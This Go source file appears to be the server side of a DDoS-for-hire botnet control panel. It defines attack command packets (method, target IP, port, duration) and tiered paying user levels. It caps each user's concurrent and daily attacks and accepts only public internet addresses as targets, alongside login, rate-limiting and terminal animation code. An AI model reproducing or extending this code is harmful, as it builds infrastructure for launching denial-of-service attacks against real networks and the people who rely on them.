package main

import (
	"bufio"
	"crypto/rand"
	"crypto/sha256"
	"encoding/json"
	"fmt"
	"net"
	"os"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"time"

	"golang.org/x/crypto/bcrypt"
)

type Animation struct {
	frames []string
	delay  time.Duration
}

type CommandPacket struct {
	Method   [16]byte
	TargetIP [4]byte
	Port     uint16
	Duration uint32
	Reserved [16]byte
}

type Client struct {
	conn net.Conn
}

type Level int

const (
	Owner Level = iota
	Admin
	Pro
	Basic
)

type User struct {
	Username  string    `json:"username,omitempty"`
	Password  string    `json:"password,omitempty"`
	Expire    time.Time `json:"expire"`
	Level     string    `json:"level"`
	APIToken  string    `json:"api_token,omitempty"`
	APISecret string    `json:"api_secret,omitempty"`
}

type AuthAttempt struct {
	Count       int
	LastAttempt time.Time
	Lock        sync.Mutex
}

type UserQuota struct {
	MaxConcurrentAttacks int
	MaxDailyAttacks      int
	MaxAttackDuration    time.Duration
	AttackCountToday     int
	LastReset            time.Time
}

// Global variables
var (
	LoadingAnimation = Animation{
		frames: []string{
			"[    ]",
			"[=   ]",
			"[==  ]",
			"[=== ]",
			"[====]",
			"[ ===]",
			"[  ==]",
			"[   =]",
			"[    ]",
			"[   =]",
			"[  ==]",
			"[ ===]",
			"[====]",
			"[=== ]",
			"[==  ]",
			"[=   ]",
			"[    ]",
			"[=   ]",
			"[==  ]",
			"[=== ]",
			"[====]",
			"[ ===]",
			"[  ==]",
			"[   =]",
			"[    ]",
			"[   =]",
			"[  ==]",
			"[ ===]",
			"[====]",
			"[=== ]",
			"[==  ]",
			"[=   ]",
		},
		delay: 100 * time.Millisecond,
	}

	SuccessAnimation = Animation{
		frames: []string{
			"[x]", "[+]", "[*]", "[✓]", "[✔]",
		},
		delay: 300 * time.Millisecond,
	}

	AttackAnimation = Animation{
		frames: []string{
			"🔺", "🔻", "🔸", "🔹",
		},
		delay: 200 * time.Millisecond,
	}
)

var sessions *BoundedMap

var (
	authAttempts   = sync.Map{}
	maxAttempts    = 3
	lockoutTime    = 5 * time.Minute
	sessionTimeout = 30 * time.Minute
	userQuotas     = sync.Map{}
	defaultQuota   = &UserQuota{
		MaxConcurrentAttacks: 3,
		MaxDailyAttacks:      10,
		MaxAttackDuration:    300 * time.Second,
	}
)

var (
	ipConnectionCounts  = make(map[string]int)
	ipConnectionMutex   sync.Mutex
	maxConnectionsPerIP = 5
)

// Animation methods
func (a *Animation) Play(conn net.Conn, duration time.Duration, message string) {
	endTime := time.Now().Add(duration)
	frameIndex := 0
	conn.Write([]byte("\r\033[K\033[?25l"))
	for time.Now().Before(endTime) {
		frame := a.frames[frameIndex]
		conn.Write([]byte(fmt.Sprintf("\r%s %s", frame, message)))
		time.Sleep(a.delay)
		frameIndex = (frameIndex + 1) % len(a.frames)
	}

	conn.Write([]byte("\033[?25h"))
}

func (a *Animation) PlayCentered(conn net.Conn, duration time.Duration, message string) {
	endTime := time.Now().Add(duration)
	frameIndex := 0
	conn.Write([]byte("\r\033[K\033[?25l"))
	termWidth := 80
	for time.Now().Before(endTime) {
		frame := a.frames[frameIndex]
		fullText := fmt.Sprintf("%s %s", frame, message)
		padding := (termWidth - len(fullText)) / 2
		if padding < 0 {
			padding = 0
		}
		conn.Write([]byte(fmt.Sprintf("\r%s%s", strings.Repeat(" ", padding), fullText)))
		time.Sleep(a.delay)
		frameIndex = (frameIndex + 1) % len(a.frames)
	}

	conn.Write([]byte("\033[?25h"))
}

// User level methods
func (user *User) GetLevel() Level {
	switch user.Level {
	case "Owner":
		return Owner
	case "Admin":
		return Admin
	case "Pro":
		return Pro
	case "Basic":
		return Basic
	default:
		return Basic
	}
}

// Utility functions for rendering
func writeError(conn net.Conn, msg string) {
	conn.Write([]byte(fmt.Sprintf("\x1b[38;5;196m[ERROR]\x1b[0m %s\r\n", msg)))
}

func writeSuccess(conn net.Conn, msg string) {
	conn.Write([]byte(fmt.Sprintf("\x1b[38;5;82m[SUCCESS]\x1b[0m %s\r\n", msg)))
}

func writePrompt(conn net.Conn, msg string) {
	conn.Write([]byte(fmt.Sprintf("\x1b[38;5;226m%s\x1b[0m ", msg)))
}

func ShowProgressBar(conn net.Conn, duration time.Duration, message string) {
	start := time.Now()
	end := start.Add(duration)
	width := 20
	conn.Write([]byte("\033[?25l"))
	for time.Now().Before(end) {
		elapsed := time.Since(start)
		progress := float64(elapsed) / float64(duration)
		if progress > 1.0 {
			progress = 1.0
		}
		bar := makeProgressBar(width, progress)
		conn.Write([]byte(fmt.Sprintf("\r\033[K%s [%s] %.1f%%", message, bar, progress*100)))
		time.Sleep(100 * time.Millisecond)
	}
	conn.Write([]byte(fmt.Sprintf("\r\033[K%s [%s] 100%%\n", message, makeProgressBar(width, 1.0))))

	conn.Write([]byte("\033[?25h"))
}

func makeProgressBar(width int, progress float64) string {
	completed := int(progress * float64(width))
	if completed > width {
		completed = width
	}
	remaining := width - completed
	bar := ""
	for i := 0; i < completed; i++ {
		bar += "█"
	}
	for i := 0; i < remaining; i++ {
		bar += "▒"
	}
	return bar
}

func FadeText(text string, conn net.Conn) {
	colors := []int{240, 245, 250, 255, 250, 245, 240}
	conn.Write([]byte("\033[?25l"))
	for i := 0; i < 3; i++ {
		for _, color := range colors {
			conn.Write([]byte(fmt.Sprintf("\r\033[K\033[38;5;%dm%s", color, text)))
			time.Sleep(50 * time.Millisecond)
		}
	}
	conn.Write([]byte("\033[0m\033[?25h"))
}

// GIF handling functions
func gifs(filename string, client net.Conn) {
	filePath := filepath.Join("data/gifs", filepath.Base(filename))
	if !strings.HasSuffix(filePath, ".tfx") {
		return
	}
	file, err := os.Open(filePath)
	if err != nil {
		client.Write([]byte("Error opening GIF file: " + err.Error() + "\r\n"))
		return
	}
	defer file.Close()
	client.Write([]byte("\033[2J\033[H\033[?25l"))
	scanner := bufio.NewScanner(file)
	buffer := make([]byte, 0, 4096)
	for scanner.Scan() {
		line := scanner.Text()
		line = strings.TrimRight(line, "\r\n")

		if strings.Contains(line, "\033[") {
			buffer = append(buffer, line...)
			buffer = append(buffer, "\r\n"...)

			if len(buffer) > 2048 {
				client.Write(buffer)
				buffer = buffer[:0]
			}
		} else {
			if len(buffer) > 0 {
				client.Write(buffer)
				buffer = buffer[:0]
			}
			client.Write([]byte(line + "\r\n"))
		}

		time.Sleep(2 * time.Millisecond)
	}
	if len(buffer) > 0 {
		client.Write(buffer)
	}
	if err := scanner.Err(); err != nil {
		client.Write([]byte("Error reading GIF file: " + err.Error() + "\r\n"))
	}
	client.Write([]byte("\033[?25h\r\n\r\n"))
}

func listGifs(client net.Conn) {
	dirPath := "data/gifs/"
	if _, err := os.Stat(dirPath); os.IsNotExist(err) {
		client.Write([]byte("GIFs directory not found\r\n"))
		return
	}
	files, err := os.ReadDir(dirPath)
	if err != nil {
		client.Write([]byte("Error reading directory\r\n"))
		return
	}
	var gifFiles []string
	for _, file := range files {
		if !file.IsDir() && strings.HasSuffix(file.Name(), ".tfx") {
			gifFiles = append(gifFiles, file.Name())
		}
	}
	if len(gifFiles) == 0 {
		client.Write([]byte("No GIF files found\r\n"))
		return
	}
	client.Write([]byte("\033[38;5;51mAvailable GIFs:\033[0m\r\n"))
	for i, file := range gifFiles {
		client.Write([]byte(fmt.Sprintf("  \033[38;5;214m%d.\033[0m %s\r\n", i+1, file)))
	}
}

func gifCommandHandler(args []string, client net.Conn) {
	if len(args) < 2 {
		client.Write([]byte("Usage: gif <filename.tfx> or gif list\r\n"))
		return
	}
	command := strings.ToLower(args[1])

	if command == "list" {
		listGifs(client)
		return
	}

	filename := args[1]
	// Validate filename format
	if !ValidateFilename(filename) {
		writeError(client, "Invalid filename. Only alphanumeric names with .tfx extension are allowed.")
		return
	}

	if !strings.HasSuffix(filename, ".tfx") {
		filename += ".tfx"
	}
	client.Write([]byte("\033[38;5;214mDisplaying: " + filename + "\033[0m\r\n"))
	time.Sleep(800 * time.Millisecond)
	gifs(filename, client)
}

// Connection management functions
func CheckConnectionLimit(ip string) bool {
	ipConnectionMutex.Lock()
	defer ipConnectionMutex.Unlock()
	if ipConnectionCounts[ip] >= maxConnectionsPerIP {
		return false
	}
	ipConnectionCounts[ip]++
	return true
}

func ReleaseConnection(ip string) {
	ipConnectionMutex.Lock()
	defer ipConnectionMutex.Unlock()
	if ipConnectionCounts[ip] > 0 {
		ipConnectionCounts[ip]--
	}
}

func CleanupConnectionCounts() {
	ticker := time.NewTicker(1 * time.Hour)
	defer ticker.Stop()

	for range ticker.C {
		ipConnectionMutex.Lock()
		for ip := range ipConnectionCounts {
			ipConnectionCounts[ip] = 0
		}
		ipConnectionMutex.Unlock()
	}
}

func secureCompare(a, b string) bool {
	return constantTimeCompare(a, b)
}

func constantTimeCompare(a, b string) bool {
	return SecureCompare(a, b)
}

func AuthUser(username, password string) (bool, *User) {
	usersFile, err := os.ReadFile("data/json/users.json")
	if err != nil {
		// Use secure compare instead of dummy operations
		secureCompare("dummy", "dummy") // Prevent timing attacks
		return false, nil
	}
	var users []User
	if err := json.Unmarshal(usersFile, &users); err != nil {
		return false, nil
	}
	var foundUser *User
	for i := range users {
		if constantTimeCompare(users[i].Username, username) {
			foundUser = &users[i]
		}
	}
	if foundUser == nil {
		return false, nil
	}
	if !verifyPassword(foundUser.Password, password) {
		return false, nil
	}
	if foundUser.Expire.Before(time.Now().UTC()) {
		return false, nil
	}
	return true, foundUser
}

func hashString(input string) (string, error) {
	salt := make([]byte, 16)
	if _, err := rand.Read(salt); err != nil {
		return "", err
	}
	hash := sha256.Sum256(append(salt, []byte(input)...))
	return fmt.Sprintf("%x:%x", salt, hash), nil
}

func hashPassword(password string) (string, error) {
	hash, err := bcrypt.GenerateFromPassword([]byte(password), bcrypt.DefaultCost)
	if err != nil {
		return "", err
	}
	return string(hash), nil
}

func verifyPassword(hashedPassword, password string) bool {
	return bcrypt.CompareHashAndPassword([]byte(hashedPassword), []byte(password)) == nil
}

func HashAPISecret(secret string) (string, error) {
	return hashPassword(secret)
}

func VerifyAPISecret(hashedSecret, secret string) bool {
	return verifyPassword(hashedSecret, secret)
}

func loadUsers() ([]User, error) {
	usersFile, err := os.ReadFile(USERS_FILE)
	if err != nil {
		return nil, err
	}
	var users []User
	if err := json.Unmarshal(usersFile, &users); err != nil {
		return nil, err
	}
	return users, nil
}

// Utility functions
func getConsoleTitleAnsi(title string) string {
	return "\u001B]0;" + title + "\a"
}

func setTitle(conn net.Conn, title string) {
	titleSequence := fmt.Sprintf("\033]0;%s\007", title)
	conn.Write([]byte(titleSequence))
}

func GetLevelFromString(level string) Level {
	switch level {
	case "Owner":
		return Owner
	case "Admin":
		return Admin
	case "Pro":
		return Pro
	case "Basic":
		return Basic
	default:
		return Basic
	}
}

func randomString(n int) (string, error) {
	const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	bytes := make([]byte, n)
	if _, err := rand.Read(bytes); err != nil {
		return "", err
	}
	for i := range bytes {
		bytes[i] = letters[bytes[i]%byte(len(letters))]
	}
	return string(bytes), nil
}

func GenerateAPITokenPair() (string, string, error) {
	tok, err := randomString(16)
	if err != nil {
		return "", "", err
	}
	sec, err := randomString(24)
	if err != nil {
		return "", "", err
	}
	return tok, sec, nil
}

// Rate limiting functions
func CheckAuthRateLimit(ip string) bool {
	attemptRaw, exists := authAttempts.Load(ip)
	if !exists {
		authAttempts.Store(ip, &AuthAttempt{Count: 0, LastAttempt: time.Now()})
		return true
	}
	attempt := attemptRaw.(*AuthAttempt)
	attempt.Lock.Lock()
	defer attempt.Lock.Unlock()
	if time.Since(attempt.LastAttempt) > lockoutTime {
		attempt.Count = 0
	}
	if attempt.Count >= maxAttempts {
		LogRateLimit(ip, "Too many authentication attempts")
		return false
	}
	attempt.Count++
	attempt.LastAttempt = time.Now()
	return true
}

func ResetAuthAttempts(ip string) {
	authAttempts.Delete(ip)
}

// Validation functions
func ValidateIP(ipStr string) bool {
	ip := net.ParseIP(ipStr)
	if ip == nil {
		return false
	}

	// Use standard library methods for validation
	if ip.IsLoopback() || ip.IsMulticast() || ip.IsLinkLocalUnicast() ||
		ip.IsLinkLocalMulticast() || ip.IsUnspecified() {
		return false
	}

	// Check for private networks using standard methods
	if ip4 := ip.To4(); ip4 != nil {
		privateNetworks := []*net.IPNet{
			{IP: net.IPv4(10, 0, 0, 0), Mask: net.CIDRMask(8, 32)},     // 10.0.0.0/8
			{IP: net.IPv4(172, 16, 0, 0), Mask: net.CIDRMask(12, 32)},  // 172.16.0.0/12
			{IP: net.IPv4(192, 168, 0, 0), Mask: net.CIDRMask(16, 32)}, // 192.168.0.0/16
			{IP: net.IPv4(169, 254, 0, 0), Mask: net.CIDRMask(16, 32)}, // 169.254.0.0/16
			{IP: net.IPv4(100, 64, 0, 0), Mask: net.CIDRMask(10, 32)},  // 100.64.0.0/10
			{IP: net.IPv4(127, 0, 0, 0), Mask: net.CIDRMask(8, 32)},    // 127.0.0.0/8
			{IP: net.IPv4(0, 0, 0, 0), Mask: net.CIDRMask(8, 32)},      // 0.0.0.0/8
		}

		for _, network := range privateNetworks {
			if network.Contains(ip4) {
				return false
			}
		}

		// Documentation/example addresses
		docNetworks := []*net.IPNet{
			{IP: net.IPv4(192, 0, 2, 0), Mask: net.CIDRMask(24, 32)},    // 192.0.2.0/24
			{IP: net.IPv4(198, 51, 100, 0), Mask: net.CIDRMask(24, 32)}, // 198.51.100.0/24
			{IP: net.IPv4(203, 0, 113, 0), Mask: net.CIDRMask(24, 32)},  // 203.0.113.0/24
		}

		for _, network := range docNetworks {
			if network.Contains(ip4) {
				return false
			}
		}
	} else {
		// IPv6 specific checks using standard methods
		ip6 := ip.To16()

		// Unique local addresses (fc00::/7)
		if ip6[0] == 0xfc || ip6[0] == 0xfd {
			return false
		}

		// Documentation addresses (2001:db8::/32)
		if len(ip6) >= 4 && ip6[0] == 0x20 && ip6[1] == 0x01 && ip6[2] == 0x0d && ip6[3] == 0xb8 {
			return false
		}

		// Discard addresses (100::/64)
		if len(ip6) >= 8 && ip6[0] == 0x01 && ip6[1] == 0x00 && ip6[2] == 0x00 && ip6[3] == 0x00 &&
			ip6[4] == 0x00 && ip6[5] == 0x00 && ip6[6] == 0x00 && ip6[7] == 0x00 {
			return false
		}
	}

	return ip.IsGlobalUnicast()
}

func ValidatePort(portStr string) bool {
	port, err := strconv.Atoi(portStr)
	if err != nil {
		return false
	}
	return port > 0 && port <= 65535
}

func ValidateDuration(durationStr string) (time.Duration, bool) {
	duration, err := strconv.Atoi(durationStr)
	if err != nil {
		return 0, false
	}
	if duration < 1 || duration > 3600 {
		return 0, false
	}

	return time.Duration(duration) * time.Second, true
}

func ValidateUsername(username string) bool {
	match, _ := regexp.MatchString("^[a-zA-Z0-9_-]{3,20}$", username)
	return match
}

func ValidatePassword(password string) bool {
	if len(password) < 8 {
		return false
	}

	hasUpper := regexp.MustCompile(`[A-Z]`).MatchString(password)
	hasLower := regexp.MustCompile(`[a-z]`).MatchString(password)
	hasNumber := regexp.MustCompile(`[0-9]`).MatchString(password)

	return hasUpper && hasLower && hasNumber
}

func ValidateFilename(filename string) bool {
	// Allow only alphanumeric characters, hyphens, underscores, and .tfx extension
	match, _ := regexp.MatchString("^[a-zA-Z0-9_-]+\\.tfx$", filename)
	return match
}

func CleanupSessions() {
	ticker := time.NewTicker(5 * time.Minute)
	defer ticker.Stop()

	for range ticker.C {
		now := time.Now()
		sessions.Range(func(key string, value interface{}) bool {
			session := value.(*Session)
			if now.Sub(session.LastActive) > sessionTimeout {
				LogSessionEvent(session.User.Username, session.IP, "EXPIRED")
				sessions.Delete(key)
			}
			return true
		})
	}
}

// User quota management functions
func GetUserQuota(username string) *UserQuota {
	quotaRaw, exists := userQuotas.Load(username)
	var quota *UserQuota
	if exists {
		quota = quotaRaw.(*UserQuota)
		if time.Since(quota.LastReset) >= 24*time.Hour {
			quota.AttackCountToday = 0
			quota.LastReset = time.Now()
		}
	} else {
		quota = &UserQuota{
			MaxConcurrentAttacks: defaultQuota.MaxConcurrentAttacks,
			MaxDailyAttacks:      defaultQuota.MaxDailyAttacks,
			MaxAttackDuration:    defaultQuota.MaxAttackDuration,
			AttackCountToday:     0,
			LastReset:            time.Now(),
		}
		userQuotas.Store(username, quota)
	}
	return quota
}

func CanLaunchAttack(username string, duration time.Duration) (bool, string) {
	quota := GetUserQuota(username)
	activeAttacks := 0
	attackLock.Lock()
	for _, attack := range ongoingAttacks {
		if attack.user == username && time.Now().Before(attack.start.Add(attack.duration)) {
			activeAttacks++
		}
	}
	attackLock.Unlock()
	if activeAttacks >= quota.MaxConcurrentAttacks {
		return false, "Too many concurrent attacks"
	}
	if quota.AttackCountToday >= quota.MaxDailyAttacks {
		return false, "Daily attack limit reached"
	}
	if duration > quota.MaxAttackDuration {
		return false, "Attack duration exceeds maximum allowed"
	}
	quota.AttackCountToday++
	userQuotas.Store(username, quota)

	return true, ""
}

func CleanupQuotas() {
	ticker := time.NewTicker(1 * time.Hour)
	defer ticker.Stop()

	for range ticker.C {
		userQuotas.Range(func(key, value interface{}) bool {
			quota := value.(*UserQuota)
			if time.Since(quota.LastReset) >= 24*time.Hour {
				quota.AttackCountToday = 0
				quota.LastReset = time.Now()
			}
			return true
		})
	}
}

func CleanupAuthAttempts() {
	ticker := time.NewTicker(1 * time.Hour)
	defer ticker.Stop()

	for range ticker.C {
		authAttempts.Range(func(key, value interface{}) bool {
			attempt := value.(*AuthAttempt)
			attempt.Lock.Lock()
			if time.Since(attempt.LastAttempt) > 24*time.Hour {
				authAttempts.Delete(key)
			}
			attempt.Lock.Unlock()
			return true
		})
	}
}

func init() {
	// Initialize sessions before using it
	sessions = NewBoundedMap(MaxSessions)

	go CleanupSessions()
	go CleanupQuotas()
	go CleanupAuthAttempts()
	go CleanupConnectionCounts()
}
